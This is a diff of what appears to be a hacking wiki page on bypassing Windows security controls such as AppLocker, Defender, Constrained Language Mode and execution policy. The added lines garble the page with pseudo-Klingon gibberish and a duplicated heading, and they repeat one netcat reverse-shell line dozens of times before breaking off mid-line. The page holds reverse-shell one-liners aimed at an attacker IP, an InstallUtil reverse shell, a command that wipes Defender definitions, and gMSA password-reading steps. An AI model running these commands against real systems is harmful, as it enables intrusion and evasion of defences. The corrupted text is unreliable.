@@ -31,7 +31,6 @@ It is common for organizations to **block cmd.exe and PowerShell.exe** and write
 ### Check
 
 Check which files/extensions are blacklisted/whitelisted:
-
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -40,27 +39,23 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-
-This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
-
-- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
-
-
 ### Bypass
 
-* Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
+* **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
 
+### qIj
+
+* **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-
-* Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
+* **"LOLBAS's"** binaries that are commonly **trusted** can be useful to bypass AppLocker.
 * **Poorly written rules could also be bypassed**
-  * For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  * Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
+* For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
+* Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
 * **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
 * You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
@@ -117,7 +112,6 @@ PSComputerName                  :
 </code></pre>
 
 To enumerate it you could also run:
-
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -126,7 +120,6 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-
 ## Encrypted File System (EFS)
 
 EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
@@ -176,18 +169,16 @@ The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword*
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
 
 You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
-
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
+**[QaStaHvIS lo'laHbe'](https://cube0x0.github.io/Relaying-for-gMSA/)**
 
-**[Find more info in this post](https://cube0x0.github.io/Relaying-for-gMSA/)**
-
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+'ej, **NTLM relay attack** **qar'a'** **gMSA** **password** **cha'logh** **web page** [qaStaHvIS](https://cube0x0.github.io/Relaying-for-gMSA/) **chel**.
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+**Local Administrator Password Solution (LAPS)**, [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) **download** **jatlh**, **local Administrator passwords** **management** **jatlh**. **randomized**, **unique**, **regularly changed** **passwords** **centrally** **stored** **Active Directory**. **passwords** **access** **authorized users** **ACLs** **restricted**. **permissions** **granted**, **local admin passwords** **read** **capability**.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -198,40 +189,525 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
 
 ### **Check**
-
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
-
 ### Bypass
 
+#### Description
+
+A bypass is a technique used to circumvent or evade security measures in order to gain unauthorized access or perform malicious activities. In the context of authentication, a bypass refers to methods that allow an attacker to bypass the authentication process and gain access to a system or application without providing valid credentials.
+
+#### UAC Bypass
+
+User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to the system. However, there are several techniques that can be used to bypass UAC and gain elevated privileges. Some common UAC bypass techniques include:
+
+- **DLL Hijacking**: This technique involves replacing a legitimate DLL file with a malicious one that is loaded by a trusted application, allowing the attacker to execute arbitrary code with elevated privileges.
+
+- **Fileless UAC Bypass**: This technique leverages the Windows Event Viewer to execute a malicious script without triggering UAC prompts.
+
+- **Token Manipulation**: By manipulating access tokens, an attacker can bypass UAC and gain elevated privileges.
+
+#### EFS Bypass
+
+Encrypting File System (EFS) is a feature in Windows that allows users to encrypt files and folders to protect sensitive data. However, there are techniques that can be used to bypass EFS and gain access to encrypted files. Some common EFS bypass techniques include:
+
+- **Cold Boot Attack**: This technique involves extracting encryption keys from the computer's memory after a cold reboot, bypassing the need for the user's password.
+
+- **Password Cracking**: If the user's password is weak or easily guessable, an attacker can use password cracking techniques to gain access to encrypted files.
+
+- **Key Escrow**: In some cases, encryption keys may be stored in a key escrow system, allowing authorized individuals to bypass EFS and access encrypted files.
+
+#### Conclusion
+
+Bypass techniques can be used by attackers to circumvent security measures and gain unauthorized access to systems or applications. It is important for organizations to implement strong security controls and regularly update their systems to mitigate the risk of bypass attacks.
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
+**QaStaHvIS Windows** vaj **Bypass** vItlhutlh. **'ej** [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) **vaj**.
 
-In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
-
-#### Direct bypass:
-
+**'ej** _**'oH**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` **'ej** **.Net4.5** **lo'laH**.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
+#### Qa'Hom 'ej Qa'Hom: 
 
-#### Reverse shell:
+```bash
+nc -e /bin/sh <attacker IP> <port>
+```
 
+```bash
+bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1
+```
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker IP> <port> >/tmp/f
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+nc -e /bin/bash <attacker IP> <port>
+```
+
+```bash
+ncat <attacker IP> <port> -e /bin/bash
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
+```
+
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc <att
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+**ReflectivePick** (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or **SharpPick** (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) jatlh **Powershell** code vItlhutlh process 'ej bypass the constrained mode. **Info** laH check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## PS Execution Policy
 
-By default it is set to **restricted.** Main ways to bypass this policy:
-
+**restricted.** vItlhutlh 'ej bypass policy:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -251,33 +727,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-
 More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ## Security Support Provider Interface (SSPI)
 
-Is the API that can be use to authenticate users.
+**SSPI** jatlh API'e'chugh, qaStaHvIS lo'laHbe'chugh users authenticate.
 
-The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.
+**SSPI** qaStaHvIS yIqaw, cha'logh cha'logh machin'e'pu' cha'logh protocol leghlaHbe'chugh. **Kerberos** jatlh protocol'e'chugh yIqaw. **SSPI** jatlh authentication protocol leghlaHbe'chugh negotiate, 'ej 'oH cha'logh Windows machin'e'pu' DLL'e'chugh jatlh Security Support Provider (SSP) leghlaHbe'chugh, 'ej cha'logh machin'e'pu' cha'logh SSP jatlhbe'chugh yIqaw.
 
 ### Main SSPs
 
-* **Kerberos**: The preferred one
-  * %windir%\Windows\System32\kerberos.dll
-* **NTLMv1** and **NTLMv2**: Compatibility reasons
-  * %windir%\Windows\System32\msv1\_0.dll
-* **Digest**: Web servers and LDAP, password in form of a MD5 hash
-  * %windir%\Windows\System32\Wdigest.dll
-* **Schannel**: SSL and TLS
-  * %windir%\Windows\System32\Schannel.dll
-* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
-  * %windir%\Windows\System32\lsasrv.dll
+* **Kerberos**: jatlhbe'chugh
+* %windir%\Windows\System32\kerberos.dll
+* **NTLMv1** 'ej **NTLMv2**: Compatibility reasons
+* %windir%\Windows\System32\msv1\_0.dll
+* **Digest**: Web servers 'ej LDAP, password in form of a MD5 hash
+* %windir%\Windows\System32\Wdigest.dll
+* **Schannel**: SSL 'ej TLS
+* %windir%\Windows\System32\Schannel.dll
+* **Negotiate**: jatlhbe'chugh protocol negotiate (Kerberos 'ej NTLM, Kerberos jatlhbe'chugh default)
+* %windir%\Windows\System32\lsasrv.dll
 
-#### The negotiation could offer several methods or only one.
+#### negotiation vItlhutlh
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) jatlh feature'e', **consent prompt for elevated activities** enable.
 
 {% content-ref url="windows-security-controls/uac-user-account-control.md" %}
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
@@ -286,7 +761,7 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) jatlh **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
